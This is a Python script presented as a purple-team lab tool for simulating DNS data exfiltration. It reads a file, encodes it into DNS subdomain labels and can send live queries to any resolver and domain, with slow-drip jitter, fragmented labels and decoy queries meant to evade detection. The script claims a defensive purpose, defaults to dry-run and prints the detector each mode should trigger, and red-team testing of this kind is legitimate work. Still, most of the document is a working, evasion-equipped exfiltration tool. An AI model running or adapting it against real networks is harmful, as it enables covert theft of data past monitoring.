#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║       DNS Exfil Simulator  v2.0  — Lab / Purple Team        ║
║       Controlled environment exfiltration simulation        ║
╚══════════════════════════════════════════════════════════════╝

PURPOSE — DEFENSIVE RESEARCH ONLY:
  • Validate detection thresholds before attackers do
  • Train Blue Team on realistic traffic patterns
  • Measure MTTD (Mean Time To Detect) in your lab
  • Generate labeled datasets for ML model training

SIMULATED TECHNIQUES:
  1. Slow Drip      — tiny chunks, long random delays, jitter
  2. Burst          — rapid queries (tests volume-based detection)
  3. TXT Record     — data in DNS TXT query type
  4. Fragmented     — multi-label encoding (evades length checks)
  5. Decoy Mix      — real-looking benign queries mixed in

MODES:
  --dry-run         Print queries, send nothing (always safe)
  --live            Send real DNS queries (lab resolver only!)

Usage:
  python dns_exfil_sim.py --demo
  python dns_exfil_sim.py --file secret.txt --domain lab.local --dry-run
  python dns_exfil_sim.py --file secret.txt --domain lab.local \\
      --resolver 127.0.0.1 --mode slow-drip --delay 30 --jitter --live

Requirements: pip install dnspython
Legal: Authorized networks / lab environments only.
       NEVER run against external resolvers without written permission.
"""

import argparse
import base64
import hashlib
import os
import random
import socket
import struct
import sys
import time
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Iterator, List, Tuple

try:
    import dns.resolver
    import dns.exception
    DNSPYTHON = True
except ImportError:
    DNSPYTHON = False

# ──────────────────────────────────────────────────────────────
# Config
# ──────────────────────────────────────────────────────────────

CHUNK_SIZES = {
    "base32":     20,   # → 32 chars after encoding
    "base64url":  18,   # → 24 chars, URL-safe
    "hex":        16,   # → 32 hex chars
}

DECOY_DOMAINS = [
    "google.com", "api.github.com", "fonts.googleapis.com",
    "cdn.cloudflare.com", "static.cloudflareinsights.com",
    "login.microsoftonline.com", "s3.amazonaws.com",
    "update.googleapis.com", "analytics.google.com",
]

# ──────────────────────────────────────────────────────────────
# Encoding
# ──────────────────────────────────────────────────────────────

def encode_chunk(data: bytes, method: str) -> str:
    if method == "base32":
        return base64.b32encode(data).decode().rstrip("=").lower()
    if method == "base64url":
        return base64.urlsafe_b64encode(data).decode().rstrip("=")
    if method == "hex":
        return data.hex()
    raise ValueError(f"Unknown encoding: {method}")

def chunk_data(data: bytes, size: int) -> List[bytes]:
    return [data[i:i+size] for i in range(0, len(data), size)]

# ──────────────────────────────────────────────────────────────
# FQDN builders
# ──────────────────────────────────────────────────────────────

def fqdn_standard(seq: int, encoded: str, domain: str) -> str:
    """seq.encoded.domain"""
    return f"{seq:04x}.{encoded}.{domain}"

def fqdn_fragmented(seq: int, encoded: str, domain: str, frag_size: int = 16) -> str:
    """Split encoded into multiple labels: part1.part2.seq.domain"""
    parts = [encoded[i:i+frag_size] for i in range(0, len(encoded), frag_size)]
    return ".".join(parts) + f".{seq:04x}.{domain}"

def fqdn_session_id(session: str, seq: int, encoded: str, domain: str) -> str:
    """session.seq.encoded.domain — aids server-side reassembly"""
    return f"{session}.{seq:04x}.{encoded}.{domain}"

# ──────────────────────────────────────────────────────────────
# DNS sender
# ──────────────────────────────────────────────────────────────

def send_query(fqdn: str, resolver_ip: str, port: int = 53,
               qtype: str = "A", timeout: float = 2.0) -> Tuple[bool, str]:
    """Send DNS query. Returns (success, status_string)."""
    if DNSPYTHON:
        r = dns.resolver.Resolver()
        r.nameservers = [resolver_ip]
        r.port = port
        r.timeout = timeout
        r.lifetime = timeout
        try:
            r.resolve(fqdn, qtype)
            return True, "NOERROR"
        except dns.resolver.NXDOMAIN:
            return True, "NXDOMAIN"   # Expected in lab
        except dns.resolver.NoAnswer:
            return True, "NOANSWER"
        except dns.exception.DNSException as e:
            return False, str(e)[:40]
    # Fallback raw UDP
    return _send_raw(fqdn, resolver_ip, port, timeout)

def _send_raw(fqdn: str, ip: str, port: int, timeout: float) -> Tuple[bool, str]:
    tid = random.randint(0, 0xFFFF)
    pkt = _build_dns_query(fqdn, tid)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(pkt, (ip, port))
        s.close()
        return True, "SENT"
    except OSError as e:
        return False, str(e)[:40]

def _build_dns_query(fqdn: str, tid: int) -> bytes:
    header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    question = b""
    for label in fqdn.rstrip(".").split("."):
        b = label.encode()
        question += bytes([len(b)]) + b
    question += b"\x00" + struct.pack(">HH", 1, 1)
    return header + question

# ──────────────────────────────────────────────────────────────
# Simulation modes
# ──────────────────────────────────────────────────────────────

@dataclass
class SimConfig:
    data: bytes
    domain: str
    resolver_ip: str
    port: int
    mode: str          # slow-drip | burst | fragmented | decoy-mix
    encoding: str      # base32 | base64url | hex
    qtype: str         # A | TXT | CNAME
    delay: float       # Base delay (seconds)
    jitter: bool
    dry_run: bool
    session_id: str    # For reassembly tracking
    verbose: bool

def build_queries(cfg: SimConfig) -> List[Tuple[int, str, str]]:
    """Returns list of (seq, fqdn, qtype) tuples."""
    chunk_size = CHUNK_SIZES.get(cfg.encoding, 20)
    chunks = chunk_data(cfg.data, chunk_size)
    queries = []
    for seq, chunk in enumerate(chunks):
        enc = encode_chunk(chunk, cfg.encoding)
        if cfg.mode == "fragmented":
            fqdn = fqdn_fragmented(seq, enc, cfg.domain)
        else:
            fqdn = fqdn_session_id(cfg.session_id, seq, enc, cfg.domain)
        queries.append((seq, fqdn, cfg.qtype))
    return queries

def interleave_decoys(queries: List[Tuple], ratio: int = 3) -> List[Tuple]:
    """Insert `ratio` decoy queries between each real query."""
    result = []
    for q in queries:
        result.append(q)
        for _ in range(ratio):
            decoy = random.choice(DECOY_DOMAINS)
            result.append((-1, decoy, "A"))  # seq=-1 = decoy
    return result

def compute_delay(cfg: SimConfig) -> float:
    if cfg.mode == "burst":
        return 0.1
    base = cfg.delay
    if cfg.jitter:
        jitter_val = random.uniform(-base * 0.4, base * 0.6)
        return max(0.5, base + jitter_val)
    return base

# ──────────────────────────────────────────────────────────────
# Runner
# ──────────────────────────────────────────────────────────────

def run_simulation(cfg: SimConfig):
    queries = build_queries(cfg)
    total_payload = len(queries)

    if cfg.mode == "decoy-mix":
        queries = interleave_decoys(queries, ratio=4)

    total_queries = len(queries)
    avg_delay = 0.1 if cfg.mode == "burst" else cfg.delay

    checksum = hashlib.md5(cfg.data).hexdigest()[:8]

    print()
    print("╔══════════════════════════════════════════════════════════╗")
    print("║         DNS Exfil Simulator  v2.0  —  Lab Mode          ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"  Session ID   : {cfg.session_id}")
    print(f"  Payload      : {len(cfg.data):,} bytes  md5={checksum}")
    print(f"  Chunks       : {total_payload}  (encoding={cfg.encoding})")
    print(f"  Total queries: {total_queries}  (incl. decoys)")
    print(f"  Mode         : {cfg.mode}")
    print(f"  Query type   : {cfg.qtype}")
    print(f"  Resolver     : {cfg.resolver_ip}:{cfg.port}")
    print(f"  Domain       : {cfg.domain}")
    print(f"  Delay        : {avg_delay}s {'± jitter' if cfg.jitter else '(fixed)'}")
    est = total_queries * avg_delay
    print(f"  Estimated    : {est:.0f}s  ({est/60:.1f} min)")
    print(f"  Dry run      : {'YES — no real queries sent' if cfg.dry_run else 'NO — live queries!'}")
    print("══════════════════════════════════════════════════════════")

    if not cfg.dry_run:
        print()
        print("  ⚠️  LIVE MODE: real DNS queries will be sent to:", cfg.resolver_ip)
        confirm = input("  Type 'yes-i-own-this-lab' to confirm: ").strip()
        if confirm != "yes-i-own-this-lab":
            print("  Aborted.")
            return

    sent = 0
    failed = 0
    decoy_sent = 0
    start = datetime.utcnow()

    for seq, fqdn, qtype in queries:
        is_decoy = (seq == -1)
        label = "DECOY" if is_decoy else f"{seq+1:>4}/{total_payload}"

        if cfg.dry_run:
            if cfg.verbose or not is_decoy:
                trunc = fqdn[:80] + ("…" if len(fqdn) > 80 else "")
                print(f"  [DRY ] [{label}] {qtype:5} {trunc}")
        else:
            ok, status = send_query(fqdn, cfg.resolver_ip, cfg.port, qtype)
            icon = "OK  " if ok else "FAIL"
            if cfg.verbose or not is_decoy:
                trunc = fqdn[:70] + ("…" if len(fqdn) > 70 else "")
                print(f"  [{icon}] [{label}] {status:8} {trunc}")
            if ok:
                if is_decoy:
                    decoy_sent += 1
                else:
                    sent += 1
            else:
                failed += 1

        if seq >= 0 and seq < total_payload - 1:
            delay = compute_delay(cfg)
            if not cfg.dry_run:
                time.sleep(delay)

    elapsed = (datetime.utcnow() - start).total_seconds()
    print()
    print(f"  ✓ Done.  Elapsed: {elapsed:.1f}s")
    if not cfg.dry_run:
        print(f"  Payload chunks sent: {sent}/{total_payload}  Failed: {failed}")
        print(f"  Decoy queries sent: {decoy_sent}")
    print()
    print("  Detection check:")
    print(f"    Expected entropy > 3.8 on subdomains of .{cfg.domain}")
    print(f"    Expected {total_payload} queries, session={cfg.session_id}")
    print(f"    Mode '{cfg.mode}' should trigger: ", end="")
    expectations = {
        "slow-drip": "behavioral slow-drip detector after ~15+ queries",
        "burst":     "rate-based detector immediately",
        "fragmented":"length-based detector (multi-label encoding)",
        "decoy-mix": "entropy detector (real queries) — decoys should NOT alert",
    }
    print(expectations.get(cfg.mode, "anomaly detector"))
    print()

# ──────────────────────────────────────────────────────────────
# Demo
# ──────────────────────────────────────────────────────────────

def run_demo():
    print("\n[DEMO] Running all 4 simulation modes in dry-run (no real queries)")
    print("       This shows exactly what each attack pattern looks like.\n")

    demo_payload = (
        b"CLASSIFIED:employee_db_dump:john.doe@corp.com:salary=145000:"
        b"card=4111111111111111:ssn=123-45-6789"
    )
    domain = "lab.internal"

    for mode in ["slow-drip", "burst", "fragmented", "decoy-mix"]:
        print(f"\n{'='*60}")
        print(f"  MODE: {mode}")
        print(f"{'='*60}")
        cfg = SimConfig(
            data=demo_payload,
            domain=domain,
            resolver_ip="127.0.0.1",
            port=53,
            mode=mode,
            encoding="base32",
            qtype="TXT" if mode == "burst" else "A",
            delay=30.0,
            jitter=mode == "slow-drip",
            dry_run=True,
            session_id=hashlib.md5(f"{mode}{domain}".encode()).hexdigest()[:8],
            verbose=True,
        )
        run_simulation(cfg)
        input("\n  Press Enter for next mode...")

# ──────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="DNS Exfil Simulator — Purple Team lab tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    src = ap.add_mutually_exclusive_group()
    src.add_argument("--file",  metavar="FILE", help="File to simulate exfiltrating")
    src.add_argument("--demo",  action="store_true", help="Run all modes in dry-run")
    src.add_argument("--text",  metavar="TEXT", help="Inline text payload")

    ap.add_argument("--domain",   default="lab.internal")
    ap.add_argument("--resolver", default="127.0.0.1")
    ap.add_argument("--port",     type=int, default=53)
    ap.add_argument("--mode",     choices=["slow-drip","burst","fragmented","decoy-mix"],
                    default="slow-drip")
    ap.add_argument("--encoding", choices=["base32","base64url","hex"], default="base32")
    ap.add_argument("--qtype",    choices=["A","TXT","CNAME"], default="A")
    ap.add_argument("--delay",    type=float, default=30.0,
                    help="Base delay between queries in seconds (default: 30)")
    ap.add_argument("--jitter",   action="store_true",
                    help="Randomize delay ± 40-60%")
    ap.add_argument("--live",     action="store_true",
                    help="Send real queries (requires --resolver pointing at lab NS)")
    ap.add_argument("--verbose",  action="store_true", help="Show all queries incl. decoys")

    args = ap.parse_args()

    if args.demo:
        run_demo()
        return

    if args.file:
        p = Path(args.file)
        if not p.exists():
            print(f"[ERROR] File not found: {args.file}")
            sys.exit(1)
        data = p.read_bytes()
    elif args.text:
        data = args.text.encode()
    else:
        ap.print_help()
        sys.exit(0)

    session_id = hashlib.md5(data[:32]).hexdigest()[:8]
    cfg = SimConfig(
        data=data,
        domain=args.domain,
        resolver_ip=args.resolver,
        port=args.port,
        mode=args.mode,
        encoding=args.encoding,
        qtype=args.qtype,
        delay=args.delay,
        jitter=args.jitter,
        dry_run=not args.live,
        session_id=session_id,
        verbose=args.verbose,
    )
    run_simulation(cfg)


if __name__ == "__main__":
    main()
